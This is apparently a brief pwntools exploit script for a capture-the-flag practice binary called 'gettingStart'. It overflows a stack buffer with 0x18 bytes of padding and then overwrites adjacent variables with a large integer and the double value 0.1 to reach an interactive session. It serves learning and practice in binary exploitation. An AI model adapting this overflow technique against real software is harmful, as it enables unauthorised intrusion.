from pwn import *

p = process("./task-gettingStart_ktQeERc")

payload = 'a'*0x18

payload += p64(0x7FFFFFFFFFFFFFFF)

payload += p64(0x3FB999999999999A)
#payload += p64(0x0.199999999999)
#gdb.attach(p)
p.sendline(payload)

p.interactive()


